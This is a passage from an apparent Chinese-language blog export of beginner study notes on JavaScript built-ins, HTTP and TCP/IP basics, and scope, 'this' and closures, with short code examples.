<h3 id="日期类型（Function）"><a href="#日期类型（Function）" class="headerlink" title="日期类型（Function）"></a>日期类型（Function）</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Date</span>.now() <span class="comment">//获取当前毫秒，1970开始</span></span><br><span class="line"><span class="keyword">var</span> dt = <span class="keyword">new</span> <span class="built_in">Date</span>();</span><br><span class="line">dt.getTime() <span class="comment">// 获取毫秒数，第二行的时间对象</span></span><br><span class="line">dt.getFullYear() <span class="comment">// 年</span></span><br><span class="line">dt.getMonth() <span class="comment">// 月份（0-11）</span></span><br><span class="line">dt.getDate() <span class="comment">// 日期（1-31）</span></span><br><span class="line">dt.getHours() <span class="comment">// 小时（0-23）</span></span><br><span class="line">dt.getMinutes() <span class="comment">// 分钟 （0-59）</span></span><br><span class="line">dt.getSeconds() <span class="comment">// 秒（0-59）</span></span><br></pre></td></tr></table></figure>

<h4 id="题目：获取2017-06-10格式的日期"><a href="#题目：获取2017-06-10格式的日期" class="headerlink" title="题目：获取2017-06-10格式的日期"></a>题目：获取2017-06-10格式的日期</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">formatDate</span> (<span class="params">dt</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (!dt) &#123;</span><br><span class="line">    <span class="keyword">var</span> dt = <span class="keyword">new</span> <span class="built_in">Date</span>();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">var</span> year = dt.getFullYear();</span><br><span class="line">  <span class="keyword">var</span> month = dt.getMonth() + <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">var</span> date = dt.getDate();</span><br><span class="line">  <span class="keyword">if</span> (month &lt; <span class="number">10</span>) &#123;</span><br><span class="line">    <span class="comment">// 强制类型转换</span></span><br><span class="line">    month = <span class="string">'0'</span> + month;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (date &lt; <span class="number">10</span>) &#123;</span><br><span class="line">    <span class="comment">// 强制类型转换</span></span><br><span class="line">    date = <span class="string">'0'</span> + date;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 强制类型转换</span></span><br><span class="line">  <span class="keyword">return</span> year + <span class="string">'-'</span> + month + <span class="string">'-'</span> + date</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> dt = <span class="keyword">new</span> <span class="built_in">Date</span>();</span><br><span class="line"><span class="keyword">var</span> formattedDate = formatDate(dt);</span><br><span class="line"><span class="built_in">console</span>.log(formattedDate);</span><br></pre></td></tr></table></figure>

<hr>
<h3 id="Math对象-Object"><a href="#Math对象-Object" class="headerlink" title="Math对象(Object)"></a>Math对象(Object)</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Math</span>.random(); <span class="comment">//获取0到1之间的随机数，用作清除缓存</span></span><br></pre></td></tr></table></figure>

<h4 id="获取随机数，要求返回长度一致的字符串"><a href="#获取随机数，要求返回长度一致的字符串" class="headerlink" title="获取随机数，要求返回长度一致的字符串"></a>获取随机数，要求返回长度一致的字符串</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> random = <span class="built_in">Math</span>.random();</span><br><span class="line">random = random + <span class="string">'0000000000'</span> <span class="comment">// 后面加10个0</span></span><br><span class="line">random = random.slice(<span class="number">0</span>, <span class="number">10</span>);</span><br><span class="line"><span class="built_in">console</span>.log(random);</span><br></pre></td></tr></table></figure>

<hr>
<h3 id="数组API"><a href="#数组API" class="headerlink" title="数组API"></a>数组API</h3><ul>
<li>forEach遍历所有元素</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = [<span class="string">'a'</span>, <span class="string">'b'</span>, <span class="string">'c'</span>];</span><br><span class="line">arr.forEach(<span class="function"><span class="keyword">function</span> (<span class="params">item, index</span>) </span>&#123;</span><br><span class="line">  遍历所有数组元素</span><br><span class="line">  <span class="built_in">console</span>.log(index, item);</span><br><span class="line">  <span class="comment">// 0 a</span></span><br><span class="line">  <span class="comment">// 1 b</span></span><br><span class="line">  <span class="comment">// 2 c</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<ul>
<li>every判断所有元素是否都符合条件</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>];</span><br><span class="line"><span class="keyword">var</span> result = arr.every(<span class="function"><span class="keyword">function</span> (<span class="params">item, index</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// 用来判断数组中所有元素是不是都满足一个条件</span></span><br><span class="line">  <span class="keyword">if</span> (item &lt; <span class="number">4</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br><span class="line"><span class="built_in">console</span>.log(result);<span class="comment">// true</span></span><br></pre></td></tr></table></figure>

<ul>
<li>some判断至少有一个元素符合条件</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>];</span><br><span class="line"><span class="keyword">var</span> result = arr.some(<span class="function"><span class="keyword">function</span> (<span class="params">item, index</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (item &lt; <span class="number">2</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br><span class="line"><span class="built_in">console</span>.log(result); <span class="comment">// true</span></span><br></pre></td></tr></table></figure>

<ul>
<li>sort排序（改变原来的数组）</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = [<span class="number">1</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>];</span><br><span class="line"><span class="keyword">var</span> arr2 = arr.sort(<span class="function"><span class="keyword">function</span> (<span class="params">a, b</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// 从小到大排序</span></span><br><span class="line">  <span class="keyword">return</span> a - b;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 从大到小排序</span></span><br><span class="line">  <span class="comment">// return b - a;</span></span><br><span class="line">&#125;)</span><br><span class="line"><span class="built_in">console</span>.log(arr2);</span><br></pre></td></tr></table></figure>
<p>sort方法默认会调用每个对象的toString方法，但往往不符合人类的思维习惯，因此可以传入一个比较函数，按照我们的意愿进行排序。</p>
<p>对于sort中的比较函数，如果第一个参数想要放在第二个参数之前，那么返回-1，如果第一个参数想要放在后面，那么返回1，否则为0。</p>
<ul>
<li>map对元素重新组装，生成新数组</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>];</span><br><span class="line"><span class="keyword">var</span> arr2 = arr.map(<span class="function"><span class="keyword">function</span>(<span class="params">item, index</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// 将元素重新组装并返回</span></span><br><span class="line">  <span class="keyword">return</span> <span class="string">'&lt;b&gt;'</span> + item + <span class="string">'&lt;/b&gt;'</span></span><br><span class="line">&#125;)</span><br><span class="line"><span class="built_in">console</span>.log(arr2);</span><br></pre></td></tr></table></figure>
<ul>
<li>filter过滤符合条件的元素，生成新数组</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>];</span><br><span class="line"><span class="keyword">var</span> arr2 = arr.filter(<span class="function"><span class="keyword">function</span> (<span class="params">item, index</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (item &gt;= <span class="number">2</span>) &#123;</span><br><span class="line">    <span class="comment">// 通过某个条件过滤数组</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br><span class="line"><span class="built_in">console</span>.log(arr2)</span><br></pre></td></tr></table></figure>
<hr>
<h3 id="对象API"><a href="#对象API" class="headerlink" title="对象API"></a>对象API</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123;</span><br><span class="line">  x: <span class="number">100</span>,</span><br><span class="line">  y: <span class="number">200</span>,</span><br><span class="line">  z: <span class="number">300</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> key;</span><br><span class="line"><span class="keyword">for</span> (key <span class="keyword">in</span> obj) &#123;</span><br><span class="line">  <span class="comment">// 只打印自身属性，而不打印原型链上面的属性</span></span><br><span class="line">  <span class="keyword">if</span> (obj.hasOwnProperty(key)) &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(key, obj[key]);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="写一个能遍历对象和数组的forEach函数"><a href="#写一个能遍历对象和数组的forEach函数" class="headerlink" title="写一个能遍历对象和数组的forEach函数"></a>写一个能遍历对象和数组的forEach函数</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">forEach</span> (<span class="params">obj, fn</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (obj <span class="keyword">instanceof</span> <span class="built_in">Array</span>) &#123;</span><br><span class="line">    obj.forEach(<span class="function"><span class="keyword">function</span>(<span class="params">item, index</span>) </span>&#123;</span><br><span class="line">      fn(index, item);</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// 不是数组就是对象</span></span><br><span class="line">    <span class="keyword">for</span> (key <span class="keyword">in</span> obj) &#123;</span><br><span class="line">      fn(key, obj[key]);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<hr>
<p>2018 年 1月 7日</p>
]]></content>
      <categories>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title>了解web和网络基础</title>
    <url>/2018/01/04/%E4%BA%86%E8%A7%A3web%E5%92%8C%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/</url>
    <content><![CDATA[<p>概述建立WEB的技术，以及HTTP的产生和发展。</p>
<a id="more"></a>

<h3 id="使用HTTP协议访问网络"><a href="#使用HTTP协议访问网络" class="headerlink" title="使用HTTP协议访问网络"></a>使用HTTP协议访问网络</h3><p>当在浏览器地址栏输入URL时候，就会显示对应的web网页了。这其实是当我们输入URL之后，请求的信息被送到对应的服务器，服务器返回的内容就呈现在我们的设备上了。通过发送请求获取服务器资源的浏览器都可被称为客户端（client）。</p>
<p>web使用HTTP协议（HyperText Transfer Protocol超文本传输（转换）协议）作为规范，并且建立在HTTP协议上通信。</p>
<hr>
<h3 id="网络基础TCP-IP"><a href="#网络基础TCP-IP" class="headerlink" title="网络基础TCP/IP"></a>网络基础TCP/IP</h3><p>通常使用的网络建立在TCP/IP协议族的基础上面，HTTP属于其内部的一个子集。计算机之间要相互通信，肯定要基于相同的规则，如何探测目标，哪一边先发起通信，以及用什么语言沟通，如何结束通信这些都需要事先确定，我们将这种规则确定为协议。</p>
<p>协议中包含电缆规格选取，寻找异地用户方法，双方建立通信顺序等，这些与互联网相关联的协议集合起来称之为TCP/IP。</p>
<p>TCP/IP协议中一个很重要的方面就是分层，按层次分别分为以下四层：应用层，传输层，网络层和数据链路层。</p>
<p>分层存在许多好处，比如那个地方需要改变设计，不需要将整体重新替换，而只需要将变动的层改变即可。各层之间定义好接口，内部的内容就可以自由改变了。</p>
<p>协议层各层的作用如下：</p>
<ol>
<li><p>应用层</p>
<p> 应用层决定了向用户提供应用服务时通信的活动；</p>
<p> TCP/IP协议族内预存了各类通用的应用服务。比如FTP（File Transfer Protocol，文件传输协议）和DNS（Domain Name System，域名系统）服务就是其中两类。另外，HTTP协议也处于该层。</p>
</li>
<li><p>传输层</p>
<p> 传输层对上层应用层，提供处于网络中的两台计算机之间的数据传输。</p>
<p> 传输层存在两个性质不同的协议，分别是TCP（Transmission Control Protocol，传输控制协议）协议和UDP（User Data Protocol，用户传输报协议）协议。</p>
</li>
<li><p>网络层</p>
<p> 网络层用来处理网络上流动的数据包。数据包是网络传输的最小数据单位。规定通过怎样的路径将数据传给对方。在众多线路中选择一条传输路线。</p>
</li>
<li><p>数据链路层</p>
<p> 处理连接网络的硬件部分。包括控制操作系统，硬件设备驱动，网络适配器和光纤等物理可见部分。硬件上的范畴均在链路层的作用范围内。</p>
</li>
</ol>
<h3 id="HTTP协议的主要特点"><a href="#HTTP协议的主要特点" class="headerlink" title="HTTP协议的主要特点"></a>HTTP协议的主要特点</h3><p>简单快速：URI固定<br>灵活：头部数据类型，完成不同数据类型的传输<br>无连接：连接一次就断开<br>无状态：不能区分两次连接者的状态</p>
<hr>
<h3 id="HTTP报文"><a href="#HTTP报文" class="headerlink" title="HTTP报文"></a>HTTP报文</h3><p>请求报文包括请求行，请求头，空行和请求体<br>响应报文包括状态行，响应头，空行和响应体</p>
<p>请求行包含HTTP方法，请求页面地址，HTTP协议版本<br>请求头告诉服务端需要哪些内容，为一些key、value值<br>空行告诉服务端下面是请求体，用来分隔请求头和请求体。</p>
<p>HTTP方法：GET POST PUT DELETE HEAD</p>
<hr>
<h3 id="post和get区别"><a href="#post和get区别" class="headerlink" title="post和get区别"></a>post和get区别</h3><p><strong>GET浏览器回退无害，POST再次提交请求</strong></p>
<p>GET产生的URL可以被收藏，POST不可以</p>
<p><strong>GET请求会被浏览器主动缓存，POST不会</strong></p>
<p>GET只能进行url编码，POST支持多种编码方式</p>
<p><strong>GET请求参数保存在浏览器历史记录，POST不会保留参数</strong></p>
<p><strong>GET请求在url传送的参数长度有限制，POST没有限制<br>对参数的数据类型</strong></p>
<p>GET只接受ASCII字符，POST没有限制</p>
<p>GET比POST更不安全，因为参数直接暴露在URL上，不能传递敏感信息</p>
<p><strong>GET参数通过URL传递，POST放在request body中</strong></p>
<hr>
<h3 id="HTTP状态码"><a href="#HTTP状态码" class="headerlink" title="HTTP状态码"></a>HTTP状态码</h3><ul>
<li><p>1xx：指示信息-表示请求已接收，继续处理</p>
</li>
<li><p>2xx：成功-表示请求已被成功接收</p>
<p>  200 OK客户端请求成功</p>
<p>  206 客户端发送了一个带有range头的GET请求，服务器完成了它。</p>
</li>
<li><p>3xx：重定向-要完成请求需要进行更进一步的操作</p>
<p>  301Moved Permanently：锁清秋的页面已经转移到新的url。</p>
<p>  302 Found：请求的页面已经临时转移至新的url。</p>
<p>  304 Not Modified：客户端有缓冲的文档并发出了一个条件性的请求，服务器告诉客户，原来缓冲的文档还可以继续使用</p>
</li>
<li><p>4xx：客户端错误-请求有语法错误或者请求无法实现</p>
<p>  400 Bad Request：客户端请求有语法错误，不能被服务器所理解。</p>
<p>  401 Unauthorized：请求未经授权，这个状态码必须和WWW-Authenticate报头域一起使用。</p>
<p>  403Forbidden：对被请求的页面的访问被禁止。</p>
<p>  404请求资源不存在</p>
</li>
</ul>
<ul>
<li><p>5xx：服务器错误，服务器不能实现合法的请求</p>
<p>  500 Internal Server Error：服务器发生不可预期的错误，原来缓冲的文档还可以继续使用。</p>
<p>  503 Server Unavailable：请求未完成，服务器临时过载或者当机，一段时间后可能恢复正常。</p>
</li>
</ul>
<h3 id="HTTP持久连接（只支持1-1版本）"><a href="#HTTP持久连接（只支持1-1版本）" class="headerlink" title="HTTP持久连接（只支持1.1版本）"></a>HTTP持久连接（只支持1.1版本）</h3><p>HTTP协议采用请求-应答模式，当使用普通模式，非Keep-Alive模式时，每个请求/应答客户和服务器都要新建一个连接，完成之后断开连接（为无连接的协议）</p>
<p>当使用Keep-Alive模式时，Keep-Alive功能使得客户端到服务端的连接持续有效，当出现对服务器的后续请求时，Keep-Alive功能避免了重新建立连接。</p>
<h3 id="管线化"><a href="#管线化" class="headerlink" title="管线化"></a>管线化</h3><p>使用持久连接的情况下，某个连接上的消息类似于请求1 -&gt; 响应1 -&gt; 请求2 -&gt; 响应2 -&gt; 请求3 -&gt; 响应3</p>
<p>管线化就是将请求打包一次传过去，响应页打包一次传回来。</p>
<p>请求1 -&gt; 请求2 -&gt; 请求3 -&gt; 响应1 -&gt; 响应2 -&gt; 响应3</p>
<pre><code>管线化的特点
- 管线化机制通过持久连接完成，只有HTTP/1.1支持此技术
- 只有GET和HEAD请求可以进行管线化，而POST有所限制
- 初次创建连接时候不应启动管线机制，因为服务器不一定支持HTTP/1.1的协议。
- 管线化不会影响响应到来的顺序，如上面的例子，响应返回的顺序还是不变的
- HTTP/1.1要求服务器端支持管线化，但并不要求服务器端也对响应进行管线化处理，只是要求对于管线化的请求不失败即可。
- 由于上面提到的服务器端问题，开启管线化可能不会带来大幅度性能提升，而且很多服务端和代理程序对管线化的支持并不好，因此现代浏览器默认并未开启管线化支持。</code></pre><hr>
<p>2018 年 1月 4日</p>
]]></content>
      <categories>
        <category>HTTP</category>
      </categories>
      <tags>
        <tag>HTTP</tag>
      </tags>
  </entry>
  <entry>
    <title>作用域和闭包</title>
    <url>/2018/01/05/%E4%BD%9C%E7%94%A8%E5%9F%9F%E5%92%8C%E9%97%AD%E5%8C%85/</url>
    <content><![CDATA[<ul>
<li>函数声明和函数表达式是什么，又有什么区别呢？</li>
</ul>
<p>我们来看如下的代码：<br> <figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">fn();</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fn</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="comment">//声明</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fn1();</span><br><span class="line"><span class="keyword">var</span> fn1 = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="comment">//表达式</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>我们知道函数声明和变量都会进行提升，在函数声明之前调用函数不会报错，因为编译器已经知道这个是一个函数了，可以调用。</p>
<p>但是对于函数表达式来说，将函数表达式赋值给变量的时候，变量是得到提升了，但是赋值操作是在执行过程中进行的，所以这里在表达式执行之前，fn1变量其实是undefined的。调用就会报错。</p>
<ul>
<li>我们再来看一个例子：<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(a);</span><br><span class="line"><span class="keyword">var</span> a = <span class="number">100</span>;</span><br></pre></td></tr></table></figure>

</li>
</ul>
<p>如果你觉得输出的结果是undefined，那么恭喜你已经对提升有了较好的理解了。</p>
<p>a作为一个全局变量得到了提升，在a未赋值之前，a都被认为是undefined。</p>
<p>函数在执行之前就已经确定了this和arguments的值</p>
<a id="more"></a>

<ul>
<li>先了解一下执行上下文的概念：一段script或者函数都可以创建执行上下文，对于script来说，生成全局执行上下文，执行之前将变量定义和函数声明拿出来。</li>
</ul>
<p>对于函数来说，会在函数执行之前将函数中的变量定义、函数声明，this和arguments拿出来。</p>
<ul>
<li>this会在执行时才能确定值，定义时无法确认，比如下面的例子。<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> a = &#123;</span><br><span class="line">  name: <span class="string">'A'</span>,</span><br><span class="line">  fn: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="keyword">this</span>.name);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line">a.fn(); <span class="comment">// this === a</span></span><br><span class="line">a.fn.call(&#123;<span class="attr">name</span>: <span class="string">'B&#125;); // this === &#123;name: '</span>B<span class="string">'&#125;</span></span><br><span class="line"><span class="string">var fn1 = a.fn;</span></span><br><span class="line"><span class="string">fn1(); // this === window</span></span><br></pre></td></tr></table></figure>


</li>
</ul>
<hr>
<h3 id="变量提升如何理解"><a href="#变量提升如何理解" class="headerlink" title="变量提升如何理解"></a>变量提升如何理解</h3><ul>
<li><p>变量定义</p>
</li>
<li><p>函数声明</p>
</li>
</ul>
<hr>
<h3 id="this几种使用场景"><a href="#this几种使用场景" class="headerlink" title="this几种使用场景"></a>this几种使用场景</h3><ul>
<li>作为构造函数执行</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Foo</span>(<span class="params">name</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.name = name</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> f = <span class="keyword">new</span> Foo(<span class="string">'zhangsan);</span></span><br></pre></td></tr></table></figure>

<ul>
<li>作为对象属性执行</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123;</span><br><span class="line">  name: <span class="string">'A'</span>,</span><br><span class="line">  printName: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="keyword">this</span>.name)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line">obj.printName();</span><br></pre></td></tr></table></figure>

<ul>
<li>普通函数执行</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fn</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="keyword">this</span>);</span><br><span class="line">&#125;</span><br><span class="line">fn();</span><br></pre></td></tr></table></figure>
<ul>
<li>call,apply,bind</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fn1</span>(<span class="params">name</span>) </span>&#123;</span><br><span class="line">  alert(name);</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="keyword">this</span>);</span><br><span class="line">&#125;</span><br><span class="line">fn1.call(&#123;<span class="attr">x</span>:<span class="number">100</span>&#125;, <span class="string">'zhangsan'</span>)</span><br><span class="line">fn1.apply(&#123;<span class="attr">x</span>:<span class="number">100</span>&#125;,[<span class="string">'zhangsan'</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> fn2 = <span class="function"><span class="keyword">function</span> (<span class="params">name</span>) </span>&#123;</span><br><span class="line">  alert(name);</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="keyword">this</span>);</span><br><span class="line">&#125;.bind(&#123;<span class="attr">y</span>:<span class="number">200</span>&#125;)</span><br><span class="line"></span><br><span class="line">fn2(<span class="string">'zhangsan'</span>);</span><br></pre></td></tr></table></figure>

<p>注意bind方法只用于函数表达式</p>
<hr>
<h3 id="创建十个a标签，点击弹出相应序号"><a href="#创建十个a标签，点击弹出相应序号" class="headerlink" title="创建十个a标签，点击弹出相应序号"></a>创建十个a标签，点击弹出相应序号</h3><p>这是一种错误的写法</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> i, a;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">  a = <span class="built_in">document</span>.createElement(<span class="string">'a'</span>);</span><br><span class="line">  a.innerHTML = i + <span class="string">'&lt;/br&gt;'</span>;</span><br><span class="line">  a.addEventListener(<span class="string">'click'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">e</span>) </span>&#123;</span><br><span class="line">    e.preventDefault();</span><br><span class="line">    alert(i);</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们点击的时候肯定是在代码执行完毕过后，那么我们给每个a标签绑定的点击事件的回调函数是alert（i），此时i为一个自由变量，就会向父作用域查找，而此时执行完毕for循环后，i的值为10，所以无论点击哪个a标签产生的结果都为10。</p>
<p>下面是正确的写法</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> i;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">  (<span class="function"><span class="keyword">function</span> (<span class="params">i</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> a =<span class="built_in">document</span>.createElement(<span class="string">'a'</span>);</span><br><span class="line">    a.innerHTML = i + <span class="string">'&lt;/br&gt;'</span>;</span><br><span class="line">    a.addEventListener(<span class="string">'click'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">i</span>) </span>&#123;</span><br><span class="line">      alert (i);</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="built_in">document</span>.body.appendChild(a);</span><br><span class="line">  &#125;)(i)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<h3 id="如何理解作用域"><a href="#如何理解作用域" class="headerlink" title="如何理解作用域"></a>如何理解作用域</h3><ul>
<li>JS没有块级作用域</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 没有块级作用域</span></span><br><span class="line"><span class="keyword">if</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> name = <span class="string">'zhangsan'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(name); <span class="comment">// zhangsan</span></span><br></pre></td></tr></table></figure>

<p>在java或者c#中在大括号内定义的变量在外部是访问不到的，称之为块级作用域。<br>js中在块内和块外声明变量是一样的，所以不推荐在块内声明变量。</p>
<ul>
<li>只有函数和全局作用域（相对于低级语言）</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 函数和全局作用域</span></span><br><span class="line"><span class="keyword">var</span> a = <span class="number">100</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fn</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> a = <span class="number">200</span>;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'fn'</span>, a);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'global'</span>, a);</span><br><span class="line">fn();</span><br></pre></td></tr></table></figure>
<p>函数作用域可以保证变量不被污染。</p>
<p>下面这段代码解释了作用域链</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> a = <span class="number">100</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fn</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> b = <span class="number">200</span>;</span><br><span class="line">  <span class="comment">// 自由变量在当前函数作用域没有定义，会沿着作用域链向上查找，比如这里就向上查找到全局作用域</span></span><br><span class="line">  <span class="built_in">console</span>.log(a);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">console</span>.log(b);</span><br><span class="line">&#125;</span><br><span class="line">fn();</span><br></pre></td></tr></table></figure>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> a = <span class="number">100</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">F1</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> b = <span class="number">200</span>;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">F2</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> c = <span class="number">300</span>;</span><br><span class="line">    <span class="built_in">console</span>.log(a);</span><br><span class="line">    <span class="built_in">console</span>.log(b);</span><br><span class="line">    <span class="built_in">console</span>.log(c);</span><br><span class="line">  &#125;</span><br><span class="line">  F2();</span><br><span class="line">&#125;</span><br><span class="line">F1();</span><br></pre></td></tr></table></figure>
<p>总结一下：执行环境定义了变量或者函数有权访问的其他数据。每个执行环境都有一个变量对象(variable object)，环境中定义的所有变量和对象都保存在这个对象中，但是我们的代码不能够访问这个对象，解析器在处理数据时在后台使用它。</p>
<p>而全局执行环境是最外围的执行环境，根据ECMAScript宿主环境的不同，表示执行环境的对象不同，在浏览器中，全局执行环境对象被认为是window对象。</p>
<p>每个函数也有自己的执行环境，当执行流进入一个函数时，函数的环境就被推入到一个环境栈中。执行结束之后，栈就将其环境弹出，把控制权交给之前的执行环境。</p>
<p>当代码在一个环境中执行时，就会创建变量对象的一个作用域链。他的用途，就是保证对执行环境有权访问的所有变量和函数的有序访问。作用域链的前端，始终都是当前执行代码所在环境的变量对象。如果是函数，则将其活动对象作为变量对象。活动对象一开始只包含arguments对象。作用域链的下一个变量对象就来自于包含环境，再下一个变量对象来自于下一个包含环境，这样一层层追溯到全局执行环境。</p>
<hr>
<h3 id="实际开发闭包的应用"><a href="#实际开发闭包的应用" class="headerlink" title="实际开发闭包的应用"></a>实际开发闭包的应用</h3><p>首先来说明一下闭包的概念：闭包是指有权访问另一个函数作用域中的变量的函数。首先是函数，然后可以访问其他函数作用域中的变量。</p>
<p>闭包的两个场景</p>
<ul>
